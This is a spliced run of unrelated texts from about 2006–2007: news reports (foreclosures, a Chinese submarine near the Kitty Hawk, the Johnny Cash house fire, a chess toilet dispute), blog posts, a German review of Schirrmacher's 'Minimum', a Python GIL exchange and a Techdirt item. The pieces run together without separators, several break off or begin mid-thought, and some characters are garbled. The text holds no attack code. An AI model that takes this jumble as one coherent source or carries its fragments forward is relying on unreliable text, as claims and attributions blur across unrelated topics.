Default notices jumped 145 % in the last three months of 2006 , accelerating a trend that began in late 2005 as home sales started to cool .
It was the largest number of default notices in any three - month period since 1998 .
….
” So far , this is n’t alarming , ” said John Karevoll , chief analyst at DataQuick Information Systems , which compiled the data .
But if default notices “ keep going up at this rate , it could get nasty fast , ” he added .
I dunno .
Foreclosures are now running at the same rate as the early 90s , when our last real estate bubble burst , and are increasing at a much faster rate .
That seems fairly alarming to me .
And if I had purchased a home in the past few years using some weird negative interest mortgage , or whatever it was the loan wizards were touting in 2005 , I ’d be very alarmed .
I guess it depends on your point of view .

.. and here 's one I made earlier ...
A Chinese submarine stalked a U.S. aircraft carrier battle group in the Pacific last month and surfaced within firing range of its torpedoes and missiles before being detected , The Washington Times has learned .
The surprise encounter highlights China ’s continuing efforts to prepare for a future conflict with the U.S. , despite Pentagon efforts to try to boost relations with Beijing ’s communist - ruled military .
The submarine encounter with the USS Kitty Hawk and its accompanying warships also is an embarrassment to the commander of U.S. forces in the Pacific , Adm .
William J. Fallon , who is engaged in an ambitious military exchange program with China aimed at improving relations between the two nations ’ militaries .
Disclosure of the incident comes as Adm. Gary Roughead , commander of the U.S. Navy ’s Pacific Fleet , is making his first visit to China .
The four - star admiral was scheduled to meet senior Chinese military leaders during the weeklong visit , which began over the weekend .
According to the defense officials , the Chinese Song - class diesel - powered attack submarine shadowed the Kitty Hawk undetected and surfaced within five miles of the carrier Oct. 26 .
The surfaced submarine was spotted by a routine surveillance flight by one of the carrier group ’s planes .
The Kitty Hawk battle group includes an attack submarine and anti-submarine helicopters that are charged with protecting the warships from submarine attack .
According to the officials , the submarine is equipped with Russian - made wake - homing torpedoes and anti-ship cruise missiles .
The Kitty Hawk and several other warships were deployed in ocean waters near Okinawa at the time , as part of a routine fall deployment program .
The officials said Chinese submarines rarely have operated in deep water far from Chinese shores or shadowed U.S. vessels .
A Pacific Command spokesman declined to comment on the incident , saying details were classified .
Pentagon spokesmen also declined to comment .
The incident is a setback for the aggressive U.S. - China military exchange program being promoted by Adm .
Fallon , who has made several visits to China in recent months in an attempt to develop closer ties .
However , critics of the program in the Pentagon say China has not reciprocated and continues to deny U.S. military visitors access to key facilities , including a Beijing command center .
In contrast , Chinese military visitors have been invited to military exercises and sensitive U.S. facilities .
Additionally , military intelligence officials said Adm. Fallon has restricted U.S. intelligence - gathering activities against China , fearing that disclosure of the activities would upset relations with Beijing .
The restrictions are hindering efforts to know more about China ’s military buildup , the officials said .
“ This is a harbinger of a stronger Chinese reaction to America ’s military presence in East Asia , ” said Richard Fisher , a Chinese military specialist with the International Assessment and Strategy Center , who called the submarine incident alarming .
“ Given the long range of new Chinese sub - launched anti-ship missiles and those purchased from Russia , this incident is very serious , ” he said .
“ It will likely happen again , only because Chinese submarine captains of 40 to 50 new modern submarines entering their navy will want to test their mettle against the 7th Fleet . ”
Pentagon intelligence officials say China ’s military buildup in recent years has produced large numbers of submarines and surface ships , seeking to control larger portions of international waters in Asia , a move U.S. officials fear could restrict the flow of oil from the Middle East to Asia in the future .
Between 2002 and last year , China built 14 new submarines , including new Song - class vessels and several other types , both diesel - and nuclear - powered .
Since 1996 , when the United States dispatched two aircraft carrier battle groups to waters near Taiwan in a show of force , Beijing also has bought and built weapons designed specifically to attack U.S. aircraft carriers and other warships .
“ The Chinese have made it clear that they understand the importance of the submarine in any kind of offensive or defensive strategy to deal with a military conflict , ” an intelligence official said recently .
In late 2004 , China dispatched a Han-class submarine to waters near Guam , Taiwan and Japan .
Japan ’s military went on emergency alert after the submarine surfaced in Japanese waters .
Beijing apologized for the incursion .
The Pentagon ’s latest annual report on Chinese military power stated that China is investing heavily in weapons designed “ to interdict , at long ranges , aircraft carrier and expeditionary strike groups that might deploy to the western Pacific . ”
It could not be learned whether the U.S. government lodged a protest with China ’s government over the incident or otherwise raised the matter in official channels .

Tiletoy
Modular , electronic game prototype
At : Huddersfield , UK
By : Tuomo Tammenpää & Daniel Blackburn
For : ( personal R&D )
In : 2004
TileToy is a modular , electronic game prototype for tangible LED game tiles .
TileToy brings the flexibility inherent in digital software to a physical tile that people can touch and interact with .
By arranging the electronic tiles , players can engage themselves in various kinds of game play , ranging from fast - paced arcade style games to puzzle an learning games .
The tiles are plastic cases approximately 2 ″ square .
The main inspiration for the look and feel comes from the heyday of the LED , when plastic hand - held games ruled the gaming world .
This retro-look is fused with a more modern minimal design .
The minimalism enhances the magic of cordless boxes that simply communicate with each other .
In TileToy , technology is sealed within the design .
The interaction is based on tactile experience where no user manual is needed .
The flexible architecture of the tiles makes TileToy a versatile platform for development of various applications from several genres .
Compared with traditional tile games TileToy can take advantage of such things as changing state , animations and games where the tiles can effect the state of adjoining tiles .
Simple word games can be created where each tile displays a random letter and the players organize the letters into the longest word possible .
Numbers and arithmetic characters can be displayed with the player having to arrange the tiles into a sum to give a specified result .
Matching games are yet another way the tiles could be programmed to act as a learning aid .
Applications can be developed also to utilize the tiles purely for display purposes to show patterns , animations or even live information .
The re-programmable and constantly updated graphical information on each tile is displayed with a LED matrix system .
The screen displaying the information is an endlessly versatile surface for updated visual communication .
Each tile is controlled individually and can be used to transmit information on its own or in groups of several tiles .
The assembled tiles transmit wirelessly their individual position in relation to each other and based on that changing information , a central computer , or a dedicated tile runs the different applications .
TileToy is an open source software and hardware project , but from 2004 - 2005 , and the lot of things has changed since then .
Github repository is open but more for archival purposes .
The basic idea should be still relevant and much easier and cheaper to make over decade later .
Dear JavaScript Library Developers … Monday , December 11th , 2006 at 8:48 pm
After spending about three weeks finishing a chapter of the upcoming book introducing JavaScript libraries to non-developers I was quite amazed how tough it is at times to use different libraries .
It was frustrating putting together a set of example scripts for several effects for the oddest reasons , which is why I am now publishing my wishlist for any JavaScript library developers or maintainers .
Before you start a new library or expect people to be able to use yours immediately you might want to give these points some thought .
For library users this list might be a good â€œheads upâ€ ?
to see how much work has to go into using a library or how to pick the right library for the job at hand .
Hereâ€™s what drove me nuts :
The house was sold after Cash died in 2003
It burned down on Tuesday while renovations were being carried out for its new owner , Bee Gee Barry Gibb .
The interior of the house , in Hendersonville , Tennessee , was used in the video for Cash 's final hit , his 2002 cover of Nine Inch Nails ' Hurt .
Cash and his wife , June Carter Cash , lived in the house from 1968 until their deaths , months apart , in 2003 .
' Sanctuary and fortress '
The cause of the fire has not yet been identified .
According to the Associated Press news agency , one firefighter was hurt tackling the blaze .
Johnny Cash lived in the house from 1968 until his death
The agency said the fire spread quickly because construction workers had recently applied a flammable wood preservative to the exterior of the house during renovations .
After a few hours , little remained of the house except its stone chimneys .
" So many prominent things and prominent people in American history took place in that house - everyone from Billy Graham to Bob Dylan went into that house , " country singer Marty Stuart , a neighbour , was quoted as saying by AP .
" It was a sanctuary and a fortress for him , " Stuart said .
" There was a lot of writing that took place there .
The Folsom Prison prison record came from there , the San Quentin record , The Holy Land , the Man in Black book came from there . "
Another neighbour , Richard Sterban of country and gospel band , the Oak Ridge Boys , is quoted by the AP news agency as saying the fire may be " the good Lord 's way to make sure that it was only Johnny 's house " .

COMMENTARY : by Dave Lindorff
Dropping the First Shoe
The mainstream corporate media , which has so far been largely ignoring the issue of impeachment , will have to go to extra lengths of censorship to block out the popular movement now , with a bill on the floor of the House , and with impeachment resolutions passing in the Vermont state legislature .
Dennis Kucinich ( D - OH ) and a candidate for the Democratic presidential nomination , has dropped the first impeachment shoe , filing a bill calling for the impeachment of Vice President Dick Cheney .
Kucinich , defying the leadership of the Democratic Party , and House Speaker Nancy Pelosi ( D - CA ) , who have been struggling mightily to prevent impeachment from occurring during the waning years of the Bush presidency , on Tuesday filed three articles of impeachment , claiming that Cheney violated his oath of office and the Constitution , for deceiving Congress and the American people about weapons of mass destruction in Iraq , about alleged but nonexistent links between Saddam Hussein and Al Qaeda , and finally for making threats to invade Iran .
The bill now goes to the House Judiciary Committee , where Chairman John Conyers ( D - MI ) and the rest of the committee ’s members will have to decide whether go hold formal hearings on the charges .
( Original Article )
Neuroscientists at the University of Southern California have proposed a simple explanation for the pleasure of grasping a new concept :
The brain is getting its fix .
According to researcher Irving Biederman , the “ click ” of comprehension triggers a biochemical cascade that rewards the brain with a shot of natural opium - like substances .
Writing in American Scientist , Biederman suggests that in seeking knowledge , scholars are almost like junkies .
“ While you ’re trying to understand a difficult theorem , it ’s not fun , ” said Biederman , a professor of neuroscience .
“ But once you get it , you just feel fabulous . ”
Interestingly , Biederman says the brain ’s craving for a fix motivates humans to maximize the rate at which they absorb knowledge .
He hypothesized that knowledge addiction has strong evolutionary value because mate selection correlates closely with perceived intelligence .
Only more pressing material needs , such as hunger , can suspend the quest for knowledge , he added .
And apparently , the same mechanism may be involved in the aesthetic experience , providing a neurological explanation for the pleasure we derive from art .
Biederman ’s theory was inspired by a widely ignored 25 - year - old finding that mu-opioid receptors ( binding sites for natural opiates ) increase in density along the ventral visual pathway , a part of the brain involved in image recognition and processing .
The receptors are tightly packed in the areas of the pathway linked to comprehension and interpretation of images , but sparse in areas where visual stimuli first hit the cortex .
Biederman ’s theory holds that the greater the neural activity in the areas rich in opioid receptors , the greater the pleasure .
To test his theory Biederman used magnetic resonance imaging on human volunteers who were exposed to a wide variety of images .
The research group found that strongly preferred images prompted the greatest MRI activity in more complex areas of the ventral visual pathway .
The researchers also found that repeated viewing of an attractive image lessened both the rating of pleasure and the activity in the opioid - rich areas .
In his article , he explains this familiar experience with a neural - network model termed “ competitive learning . ”
In competitive learning ( also known as “ Neural Darwinism ” ) , the first presentation of an image activates many neurons , some strongly and a greater number only weakly .
With repetition of the image , the connections to the strongly activated neurons grow in strength .
But the strongly activated neurons inhibit their weakly activated neighbors , causing a net reduction in activity .
This reduction in activity , Biederman ’s research shows , parallels the decline in the pleasure felt during repeated viewing .
“ One advantage of competitive learning is that the inhibited neurons are now free to code for other stimulus patterns , ” Biederman explained .
This preference for novel concepts also has evolutionary value , he added .
“ The system is essentially designed to maximize the rate at which you acquire new but interpretable [ understandable ] information .
Once you have acquired the information , you best spend your time learning something else .
There ’s this incredible selectivity that we show in real time .
Without thinking about it , we pick out experiences that are richly interpretable but novel . ”

We certainly have n't seen anything to match the outpourings of bile that have followed the wannabe search engine 's little page previews , which appear on a number of wordpress.com sites and elsewhere .
The Snap Preview Anywhere technology ( also available as a Firefox plugin ! ) means that if you hover your mouse over a link , you 'll see a little popup window showing the site being linked to , attached to the place where your mouse is .
The first time , you think , " Cool ! "
The second time , you think , " Oh , that . "
The third time , most people think , " How the hell do I turn this thing off ? " ( Clue : click on the little " Options " text in the popup box and choose " Disable for ALL sites . "
Add " Damn you ! " if you like . )
Part of the revulsion over Snap Preview is in that dangerous word " popup " : it 's too like an unwanted ad .
Plus , who needs to know what the site you might go to looks like ?
The preview 's too small to tell you anything useful , but often obscures text on the page you 're still on .
Snap has been doing its best to fight off a veritable blog blizzard of disapproval : " Since launch some 700,000 websites and blogs have signed up for the service and some 180 m previews have been served , " wrote Erik Wingren , its senior researcher , on its blog ( blog.snap.com ) .
" The Snap Preview Anywhere service was designed to help users make more informed decisions about what links to click on and thereby help them navigate the internet with greater speed and accuracy . "
We still can't see it , to be honest .
Is n't that what the URL tells you ?
Meanwhile , Snap 's principal ambition - as a new search engine - may be fatally wounded .
We 'll wait and see ... without pop-ups .

Here is ques­tion 17 of 25 from Brain Fit­ness 101 : Answers to Your Top 25 Ques­tions .
Ques­tion :
Are there herbal and vit­a­min sup­ple­ments that will pro­tect my mem­o­ry ?
Key Points :
Omega‑3 and omega ‑6 fat­ty acids found in cold - water fish may be help­ful to long term brain health .
Folic acid may also be help­ful to both cog­ni­tive func­tion and hear­ing .
Gink­go bilo­ba and DHEA do not appear to help your brain .
There is still more research to be done and nev­er dis­miss the place­bo effect !
Answer :
Per­haps .
The New Eng­land Jour­nal of Med­i­cine pub­lished an arti­cle debunk­ing DHEA , a steroid pre­cur­sor to testos­terone and estro­gen used to fight aging .
The con­clu­sion of a two - year study at the Mayo Clin­ic in Min­neso­ta and Uni­ver­si­ty of Pad­ua in Italy showed it did not improve strength , phys­i­cal per­for­mance , or oth­er mea­sures of health .
The study ’s lead author , Dr. Nair said , “ No ben­e­fi­cial effects on qual­i­ty of life were observed .
There ’s no evi­dence based on this study that DHEA has an anti­ag­ing effect . ”
Gink­go bilo­ba is anoth­er over - the - counter mem­o­ry - enhanc­ing sup­ple­ment fre­quent­ly men­tioned .
Yet , Paul Solomon from Williams Col­lege found “ when tak­en fol­low­ing the manufacturer ’s instruc­tions , gink­go pro­vides no mea­sur­able ben­e­fit in mem­o­ry or relat­ed cog­ni­tive func­tion to adults with healthy cog­ni­tive func­tion . ”
Nicholas Burns from the Uni­ver­si­ty of Ade­laide , Aus­tralia found longer - term mem­o­ry improved in healthy 55 – 79 year olds , but no oth­er cog­ni­tive mea­sure improved for either younger or old­er par­tic­i­pants .
Sarah Elsabagh from King ’s Col­lege Lon­don found gink­go ini­tial­ly improved atten­tion and mem­o­ry .
How­ev­er , there were no ben­e­fits after 6 weeks , sug­gest­ing that a tol­er­ance devel­ops quick­ly .
Not an over­whelm­ing endorse­ment .
Omega‑3 fat­ty acids found in cold - water fish such as mack­er­el , her­ring , salmon , and tuna look more promis­ing .
Giu­liano Fontani ’s work at the Uni­ver­si­ty of Siena in Italy asso­ci­at­ed omega‑3 sup­ple­men­ta­tion with improved atten­tion­al and phys­i­o­log­i­cal func­tions , par­tic­u­lar­ly those involv­ing com­plex cor­ti­cal pro­cess­ing .
Folic acid sup­ple­men­ta­tion also shows promise of pro­tect­ing and improv­ing cog­ni­tive func­tion in old­er adults , accord­ing to a 2007 study pub­lished in Lancet by Jane Dur­ga and col­leagues .
It may also reduce age - relat­ed decline in hear­ing .
What can you do right now ?
Eat a bal­anced diet with plen­ty of green leafy veg­eta­bles such as spinach , kale and col­lards .
Get plen­ty of phys­i­cal exer­cise .
Stay cog­ni­tive­ly active .
Reduce your stress .
And as always , talk with your doc­tor about any health con­cerns .

In the past Barack Obama has been accused of many things — having ties to a crooked political fundraiser , for one — but this , I dare say , is a first .
In a recent column in the Henry Daily Herald of McDonough , Georgia , reporter Nicklaus Lovelady lambasts Obama for ruining his chances with a love interest working for a rival paper .
Best to let Lovelady take it from here :
I had the looks , I had the charm and I had my eye on this pretty young thing who was doing an internship for a competing paper .
It took me nearly two months of running into each other at various news events before I worked up the nerve to begin talking to her .
And then Obama shows up .
The senator made his way to SIUE one day to introduce some legislation that would increase grants for students .
Prior to that , me and the girl became really cool as I let her in on a few tricks of the trade .
The day Obama came , there was a huge press conference at the university ’s student center with about 100 people inside the conference room and hundreds more viewing the conference on a big screen in the lobby .
Obama did his thing , and at the end there was segment for questions by the media .
After about five questions from different television and newspaper reporters , I stood up to ask mine .
“ Wait a minute son , this is for professional media only , ” Obama said to me .
“ What do you mean ?
I work for the local paper , ” I said with a crackling nervous voice .
“ Oh , I ’m sorry .
I thought you were a college student .
You have such a baby face , ” he said with an unremorseful grin .
At that point everyone in the room turned to look at me and laugh .
The 800 people in the lobby laughed as my face was projected on the big screen .
Alas , the “ pretty young thing ” was laughing , too .
And , after that humiliating episode , she was no longer interested in Lovelady ’s “ tricks of the trade . ”
“ Obama owes me a public apology for making me look like a court jester and for blocking my shot , ” Lovelady ’s column concludes .
“ Until that time , Hillary or Giuliani will get my vote . ”
Not about to lose Lovelady ’s vote , Obama , who has yet to declare whether or not he ’ll seek the presidency in 2008 , phoned the reporter “ to publicly apologize for messing up your game .
I read that ; I felt terrible .
I did n’t know there were any ladies around .
I just wanted to let you know that I ’m deeply sorry . ”
Presidential material ?
Definitely .
The match was intended to unify the chess world
Two world champions , Russian Vladimir Kramnik and Bulgarian Veselin Topalov , are playing a series of matches .
Mr Kramnik is leading after four games .
But Mr Topalov has raised questions about the amount of time his opponent is spending in the toilet .
Mr Topalov was outraged by Mr Kramnik 's " suspicious behaviour " , his aide said .
His manager , Silvio Danilov , had asked to see videotapes of Mr Kramnik in his designated relaxation area , in which the toilet is the only unmonitored area .
" During every game , he visited the relaxation room 25 times at the average and the bathroom more than 50 times , " he said .
Mr Kramnik " takes his most significant decisions in a toilet " , he said , apparently suggesting that the player was somehow cheating .
' Reality show '
Match officials have now decided that both players must use the same toilet - one in a different location - but this has not pleased either camp .
Mr Kramnik did not show up for the fifth match on Friday and said in a statement to officials that he " did not sign the contract for acting in a reality show " .
" My dignity does not allow me to stand this situation , " the Associated Press news agency quoted him as saying .
Mr Topalov 's side , meanwhile , said the move changed nothing because Mr Kramnik would still be able to visit the toilet unlimited times .
The match had been intended to reunify the chess world , divided since then world champion Gary Kasparov split from the World Chess Federation in 1993 .
Whatever the outcome , the two players were due to share the $ 1 m ( £ 534,000 ) prize .
IT WAS EITHER A GENUINE sign of the end times or proof that hipsters can get into anything , but this summer and fall Aldomania sparked a national “ Mary Worth ” craze .
In case the above sentence makes no sense to you , “ Mary Worth ” is a 68 - year - old soap - opera comic strip about a nosey , passive - aggressive widow who is now ( and always has been ) about 68 years old .
And Aldomania was a fan eruption over Aldo Kelrast , a Captain Kangaroo look - alike who was stalking the strip ’s titular heroine in a plot that was at once surprisingly suspenseful and deliciously bizarre .
The Palm Beach Post published 2,100 words on the phenomenon .
Fans snapped up Aldomania T - shirts that proclaimed , “ I refuse to believe you prefer to be alone ” -- one of the stalker ’s dafter pronouncements .
The morning after a dejected Aldo drove off an ill - placed cliff , bottle of cheap hooch in hand ( no , really ) , there were three tribute videos posted to YouTube.com by 9 a.m .
These are not even the heights of the passion “ Mary Worth ” inspires , nor is “ Mary Worth ” the only comic that gets this kind of attention .
Not long ago , I thought I was pretty much alone in my deep affection for Margo Magee , a sexy , manic and amoral publicist living in the oddly chaste bizarro - Manhattan of “ Apartment 3 - G , ” another long - running soap strip .

But that was before I started comicscurmudgeon.com , where I analyze , deconstruct and mock the comics .
This site , which I thought would merely entertain my close and indulgent friends , receives about 13,000 visitors and 200 reader comments , every day .
I say this not as some sort of sad boast about my “ mad blogging skillz ” but to point out just how much gleeful energy there is in the comics community .
I ’m certainly not alone in examining the funnies online .
I can only aspire to the monomania of comics fanatics who focus their critical energy on single strips , from the well known ( “ Garfield ” ) to the obscure ( “ The Dinette Set ” ) .
I must salute “ The Silent Penultimate Panel Watch , ” a site devoted to tracking a tiny but crucial piece of comics ephemera -- how often strips stretch out a lame setup by putting a wordless reaction shot in the panel before the punch line .
And folks , give it up for the live - action “ Mary Worth , ” a mesmerizing late - '90s film ( viewable at zerotv.com and YouTube.com ) in which gifted actors perform a months ’ worth of “ Mary Worth ” strips , complete with the awkward stage gestures and improbable emphases in dialogue that are hallmarks of that venerable strip .
The only place you wo n’t find this kind of enthusiasm is in the newspaper comics pages .
Rather than nurturing a section of the paper that has a built - in and long - lived fan base , papers across the country continue to dishearten fans by cramming fewer strips into ever - shrinking spaces .
Many comics aficionados have begun to sour on the whole newsprint experience .
My own hometown paper , the Baltimore Sun , inculcated my weird love for the soap - opera strips .
But I have abandoned the Sun ’s comics page for the website of the Houston Chronicle in faraway Texas .
The Chron boasts a staggering 103 strips online ( though only 66 of them appear in the print edition ) .
The website is a haven for comics fans and a justified source of pride for the paper .
“ If we like a strip , we keep it , and I hope we continue doing that , ” says Mike Read , the Chronicle ’s Web operations and development editor .

The Houston paper is a rarity , however .
Most American papers have been steadily cutting back their comics sections for years .
It would be nice to blame the decline of comics pages on stodgy editors who are temperamentally unable to deal with the power of Aldomania and the like , but there ’s a bigger problem here .
Print circulation at American newspapers is in free - fall , and editorial space continues to shrink .
The shriveling of the comics is another symptom of a disease metastasizing throughout the newspaper business .
But maybe one reason readers are fleeing print is because the papers do n’t give them enough reason to believe print is anything special .
Few comics fans would dispute that the funnies look best on paper , or that reading the comics in newsprint over breakfast is a pleasing ritual .
Going back to the childhood of the modern newspaper business -- in the graphically rich Hearst and Pulitzer papers of the early 20th century -- one of the main attractions was always the Sunday morning treat of page after vibrant page of full - color comics .
But when was the last time an interesting - looking comics page caught your eye , let alone invited you to a full - spectrum visual feast ?
As comics sections are pared down , readers are often asked to take part in a painful ritual : voting to banish their least favorite strips into the outer darkness .
Because anything interesting invariably annoys somebody , the survivors tend to be bland time - servers that nobody hates -- or really truly likes .
For me , the end of my relationship with newsprint comics came in 2004 , when the Sun cleared out 15 strips , including most of the soapers , and offered only five new ones in exchange , reducing the overall number by more than 25 % .
Reader outcry ( some of which I admit I solicited on my site ) brought back a token pair of strips , but in a characteristic move , “ Doonesbury ” and “ The Boondocks ” were then banished to the editorial pages to make room for the returnees .
Huey Freeman ’s diatribes about UPN coexisted uneasily with Heritage Foundation scholars ’ diatribes about activist judges before “ Boondocks ” creator Aaron McGruder apparently gave up on the newspaper medium entirely .

He ’s not the only one .
Comics artists are figuring out that they can make money even if they bypass the syndicates and newspapers ( and the accompanying restrictions on image size and four - letter words ) and publish directly on the Web .
A generation that already gets most of its news from the Internet has one less reason to ever pick up a newspaper .
But before the print news medium gives up on new readers , maybe it ’s time to double down on the comics , to make the funny papers a selling point again : Give the comics an extra page .
Move the funnies out of the entertainment - section ghetto and into the A section or Sports .
Better yet , run the daily strips in a stand - alone insert -- not just on Sundays .
Get the advertising staff to start selling against the comics section ( why should TV be getting all the ads for sugary cereals and action figures ? ) .
Do something , do anything , to make the funny pages interesting .
There ’s no guarantee that this would help the situation for newspapers .
( The Houston Chronicle , like almost all papers , is still losing circulation , though at a lower rate than major comics killers such as the San Francisco Chronicle and the paper you ’re reading . )
But at least the reader would get something more exciting than the average comics page .
Or for that matter , the average “ Mary Worth . ”
Are these people trying to be stupid ?
Sofia Loginova , 17 , a Quincy
High senior , said she did n’t hire anyone to hang four backpacks emblazoned with her Web site ’s name , www.B4Class.com, and filled with newspapers and some dollar bills , from tree limbs and on a fence near the school .
The unexplained backpacks sparked a panic .
The State Police Bomb Squad brought in a mechanical robot and a bomb - sniffing dog to investigate , immediately bringing to mind the Cartoon Network marketing ploy that shut down parts of Boston for hours earlier this year .

Frank Schirrmacher stellt in seinem neuen Sachbuch - Schocker „ Minimum “ eine wichtige Hypothese auf .
Um sie zu belegen , trickst er jedoch gehörig und kümmert sich viel zu wenig um neuere Forschungen
VON GERT G. WAGNER
Katastrophenszenarien verkaufen sich besser als komplizierte Politikprojekte .
Nachdem der Demograf Herwig Birg sein düsteres Alterswerk „ Bevölkerungsdämmerung “ vorgelegt hat ( siehe taz vom 4 . März ) , folgt nun Frank Schirrmacher mit einem Buch , das vom Vergehen unserer Gemeinschaft handelt .
Der Autor , Herausgeber der FAZ , hat eine einzige – durchaus interessante und wichtige – Hypothese , die er als geübter Feuilletonist in 15 Kapiteln variiert .
Schirrmacher glaubt :
Blut ist dicker als Wasser und deswegen werden wir , die kinderarmen Deutschen , kaum lösbare Probleme bekommen .
Denn aufgrund vieler Einzelkinder und Patchworkfamilien werde es zu wenige enge verwandtschaftliche Blutbindungen geben .
Genau die seien aber notwendig , damit eine Gesellschaft funktioniert .
Schirrmacher illustriert seine
These mit unzähligen Beispielen aus der neueren Geschichte , der Literaturgeschichte sowie Geschichten , die er in Filmen und im Fernsehen erlebt .
Und immer und immer wieder wird die amerikanische Tragödie am „ Donnerpass “ zitiert , die das Buch auch dramatisch einleitet .
Schirrmacher erzählt die Geschichte von Siedlern , die 1846 in den USA gen Westen zogen , in einem Schneesturm stecken blieben und monatelang um ihr Leben kämpften .
Fast alle Männer , viele davon alleinstehende Abenteurer , starben – während die meisten Frauen überlebten , weil sie in Familien lebten und sozial eingestellt waren .
Das unterstreicht die Bedeutung von Familien in plausibler Weise .
Allerdings fragt sich Schirrmacher gelegentlich zu Recht selbst , ob wir heutzutage wirklich in einer so ausweglosen Situation leben wie sie die Siedler am Donnerpass monatelang erlebten .
Schirrmachers Grundthese leuchtet trotzdem ein :
Wenn es weniger Kinder gibt , dann gibt es auch weniger verwandtschaftliche Netzwerke und marktmäßige Austauschbeziehungen nehmen überhand .
Und das in einer Situation , in der es wegen des mangelnden Nachwuchses immer schwerer fällt , die Altersvorsorge außerhalb der Familie zu organisieren .
Die Gesellschaft degeneriert zu einem Gebilde mit einem Minimum an Zusammenhalt und Lebensqualität .
Freilich : Die kleine „ Kernfamilie “ , wie wir sie aus den Fünfziger - und Sechzigerjahren kennen und heute idealisieren , war historisch gesehen eine Ausnahme .
Schirrmacher verschweigt , dass die moderne Menschheit Jahrzehntausende in größeren Netzwerken lebte .
Manchmal trickst Schirrmacher regelrecht , um sein Argument zu stärken .
Er hat offensichtlich die neuere Diskussion um die völlig überhöhte Zahl von kinderlosen Akademikerinnen in seiner FAZ sorgfältig gelesen und schreibt : „ Achtunddreißig Prozent der westdeutschen Akademikerinnen in der Altersgruppe zwischen fünfunddreißig und neununddreißig Jahren leben ohne Kinder . “
Richtig , aber das heißt nicht , dass sie keine Kinder haben !
Bei einigen sind sie schon aus dem Haus – und etliche bekommen ihr erstes Kind erst noch .
In Wahrheit liegt der Anteil kinderloser Akademikerinnen heutzutage zwischen 25 und 30 Prozent .
Immer noch eine Menge , die durch bessere Kinderbetreuung und Ganztagsschulen reduziert werden könnte , aber eben weit weit weniger als 40 Prozent .
Weiter : Schaut man zum Beispiel auf Schirrmachers Tabelle „ Fertilität der Geburtsjahrgänge 1935 bis 1960 “ , stellt man überrascht fest , dass nach wie vor die meisten Kinder mit Geschwistern groß werden .
Also als Kinder in der Familie soziales Verhalten lernen ; hinzu kommt , von Schirrmacher aber übergangen , die Einübung von sozialem Kapital in Vorschuleinrichtungen , die gerade für Einzelkinder besonders bedeutsam sind .
Nur 22 Prozent der heutigen jungen Frauen haben Einzelkinder , mehr als die Hälfte hat zwei und mehr Kinder .
Hinzu kommt weniger als ein Viertel , das keine Kinder hat .
Das ist zwar viel , aber wir sind meilenweit davon entfernt , dass eine Mehrheit der Bevölkerung keine Kinder hat .
Die Kinderlosen sind auch nicht allein für das Nachwuchsproblem verantwortlich .
Vielmehr werden in Deutschland insbesondere auch nur noch wenige dritte , vierte und weitere Kinder geboren und dadurch die „ Bestandserhaltung “ nicht mehr erreicht .
Da die meisten aber mindestens zwei Kinder haben , werden sie später auch zu Großeltern und tragen auch dann , wenn keine Kinder mehr in ihrem Haushalt leben , zum sozialen Zusammenhalt der künftigen alten Gesellschaft bei .
Liest man alle Nebensätze bei Schirrmacher genau , dann zeigt er selbst , dass alles nicht so schlimm kommen muss – im Untertitel des Buchs wird folgerichtig nicht nur vom Vergehen , sondern auch vom Neuentstehen unserer Gesellschaft gesprochen .
Denn der Mensch ist gerade im sozialen Bereich extrem anpassungsfähig .
Zum Beispiel : Spätes Heiraten verhindert sicherlich , dass Paare mehr als zwei Kinder in die Welt setzen .
Aber : Die neuere Forschung in Europa zeigt , dass im höheren Lebensalter geschlossene Ehen wahrscheinlich länger halten .
Damit wird auch den ( Einzel - ) Kindern in solchen Ehen ein besseres Umfeld zum Aufwachsen geboten .
Oder : Selbst Männer lernen soziales Verhalten , wenn es sein muss .
In wissenschaftlichen Erhebungen , die genau hinschauen , wie zum Beispiel das vom DIW Berlin erhobene Sozio - oekonomische Panel ( SOEP ) , sieht man , dass inzwischen auch Männer sich häufig in der Pflege von Angehörigen engagieren ; sie sind allerdings meist nicht die „ Hauptpflegeperson “ und werden dadurch statistisch leicht übersehen .
Ehrenamtliche Tätigkeit geht übrigens – trotz des Geredes von der hedonistischen Gesellschaft – auch bei jungen Leuten nicht zurück .
Und schließlich : Durch Patchworkfamilien , die Schirrmacher beklagt , entstehen jede Menge Blutsbande und ausgesprochen große verwandtschaftliche Netzwerke .
Vor der Idealisierung der Kleinfamilien war das ein äußerst erfolgreiches Gesellschaftsmodell .
Heutzutage erziehen Patchworkverhältnisse zum Beispiel zu mehr Eigenverantwortung und dadurch dürften Männer frühzeitiger erwachsen werden .
Es gilt freilich auch : Wie Patchworkfamilien unsere moderne Gesellschaft verändern werden , wissen wir nicht .
Dass wir in eine so ausweglose Situation wie die amerikanischen Siedler am Donnerpass ziehen , ist jedoch sehr unwahrscheinlich .

Vom Vergehen und Neuentstehen unserer Gemeinschaft “ .

The difference is , for an OS kernel , there really is n't any other way to benefit from multiple CPUs .
But for Python , there is -- run multiple processes instead of threads ! >

Nevertheless , when the itch is bad enough , it 'll get scratched .
I think you 're overestimating the sophistication of the average extension developer , and the hardware to which they have access .
Nevertheless , you 're right the GIL is not as bad as you would initially think : you just have to undo the brainwashing you got from Windows and Java proponents who seem to consider threads as the only way to approach concurrent activities .
Just because Java was once aimed at a set - top box OS that did n't support multiple address spaces , and just because process creation in Windows used to be slow as a dog , does n't mean that multiple processes ( with judicious use of IPC ) are n't a much better approach to writing apps for multi-CPU boxes than threads .
Just Say
No to the combined evils of locking , deadlocks , lock granularity , livelocks , nondeterminism and race conditions .

Is The NBA Trying To Hide Video Footage Of The Big Brawl On YouTube ?
from the as - if - people - don't - know - about - it ? dept
Thank you for reading this Techdirt post .
With so many things competing for everyone ’s attention these days , we really appreciate you giving us your time .
We work hard every day to put quality content out there for our community .
Techdirt is one of the few remaining truly independent media outlets .
We do not have a giant corporation behind us , and we rely heavily on our community to support us , in an age when advertisers are increasingly uninterested in sponsoring small , independent sites — especially a site like ours that is unwilling to pull punches in its reporting and analysis .
While other websites have resorted to paywalls , registration requirements , and increasingly annoying / intrusive advertising , we have always kept Techdirt open and available to anyone .
But in order to continue doing so , we need your support .
We offer a variety of ways for our readers to support us , from direct donations to special subscriptions and cool merchandise — and every little bit helps .
Thank you .
– The Techdirt Team
If you pay any attention at all to basketball , you heard about the big brawl this past weekend that ended in the ejection of 10 players .
Like with just about any breaking news story that has a video component , plenty of people quickly found the video of the brawl on YouTube and blogged about it , embedding the video in their blogs .
While it may not be the sort of publicity the NBA wants , it did at least get people talking about the game .
